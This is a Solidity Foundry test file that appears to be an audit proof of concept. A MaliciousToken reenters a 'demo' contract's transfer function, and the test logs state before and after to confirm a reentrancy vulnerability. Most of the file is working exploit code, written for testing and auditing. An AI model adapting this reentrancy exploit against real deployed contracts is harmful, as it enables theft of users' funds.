// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x2972d548497286d18e92b5fa1f8f9139e5653fd2.sol";

contract MaliciousToken {
    bool public attacked;
    demo public vulnerable;
    
    constructor(demo _vulnerable) {
        vulnerable = _vulnerable;
        attacked = false;
    }

    function transferFrom(address, address to, uint256) external returns (bool) {
        if (!attacked) {
            attacked = true;
            
            // Prepare reentrancy attack parameters
            address[] memory tos = new address[](1);
            tos[0] = to;
            uint[] memory v = new uint[](1);
            v[0] = 100; // Same amount as initial transfer
            
            // Reenter the vulnerable contract
            vulnerable.transfer(address(this), address(this), tos, v);
        }
        return true;
    }
}

contract ReentrancyAuditTest is Test {
    demo public vulnerable;
    MaliciousToken public maliciousToken;
    address constant user = address(0x1);

    function setUp() public {
        vulnerable = new demo();
        maliciousToken = new MaliciousToken(vulnerable);

        // Approve malicious token for use in vulnerable contract
        vulnerable.approveToken(address(maliciousToken));
    }

    function testReentrancyAttack() public {
        // Verify initial state
        assertEq(vulnerable.getUserBalance(user), 0, "Initial user balance should be 0");
        
        uint expectedBalance = 200; // 2 transfers of 100 tokens each due to reentrancy
        uint expectedTransfers = 2; // Initial call + reentrant call
        
        // Prepare transfer parameters
        address[] memory tos = new address[](1);
        tos[0] = user;
        uint[] memory v = new uint[](1);
        v[0] = 100;
        
        // ==== ADDED DIFFERENTIAL VALIDATION ====
        console.log("--- BEFORE-Trigger State ---");
        uint256 initialUserBalance = vulnerable.getUserBalance(user);
        uint256 initialTotalTransfers = vulnerable.totalTransfers();
        console.log("User balance (before attack):", initialUserBalance);
        console.log("Total transfers (before attack):", initialTotalTransfers);

        console.log("--- Trigger Attack ---");
        // Execute transfer with malicious token
        vulnerable.transfer(address(this), address(maliciousToken), tos, v);
        
        console.log("--- AFTER-Trigger State ---");
        uint256 finalUserBalance = vulnerable.getUserBalance(user);
        uint256 finalTotalTransfers = vulnerable.totalTransfers();
        console.log("User balance (after attack):", finalUserBalance);
        console.log("Total transfers (after attack):", finalTotalTransfers);
        
        // Differential state comparison
        uint256 userBalanceDiff = finalUserBalance - initialUserBalance;
        uint256 transfersDiff = finalTotalTransfers - initialTotalTransfers;
        console.log("User balance increase:", userBalanceDiff);
        console.log("Additional transfers recorded:", transfersDiff);

        // Final vulnerability verdict
        if (userBalanceDiff > 100 || transfersDiff > 1) {
            console.log("Vulnerability Exists: Reentrancy caused abnormal state changes (balance: +%s, transfers: +%s)", userBalanceDiff, transfersDiff);
        } else {
            console.log("Vulnerability not Exist: No abnormal state changes detected");
        }
        // ==== END DIFFERENTIAL VALIDATION ====
    }
}